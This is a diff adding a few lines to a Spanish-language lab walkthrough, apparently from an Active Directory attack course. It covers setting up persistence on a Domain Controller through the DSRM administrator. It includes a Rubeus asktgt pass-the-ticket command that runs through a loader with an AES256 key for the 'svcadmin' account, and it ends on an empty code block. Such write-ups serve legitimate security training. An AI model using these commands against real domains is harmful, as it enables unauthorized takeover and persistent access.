@@ -922,3 +922,14 @@ Obteniendo como resultado que somos el usuario *administrator*
 
 *LO -11*
 Nos aprovecharemos d elos privilegios de *Domain Admin* para abusar de la credencia de *DSRM* modo de arranque seguro especial para Controladores de Dominio de Active Directory, y poder establecer persistencia en la maquina
+Podemos mantener una persistancia en el *Domain Controller* una vez tengamos los privilegios abusando del administrador de *DSRM*
+```shell
+[student97]
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+Iniciaremos un proceso con privilegios de *Domain Admin* en este casop con *svcadmin*
+Copiaremos en el proceso nuevo el *Loader*
+```shell
+[newCMD-]
+```
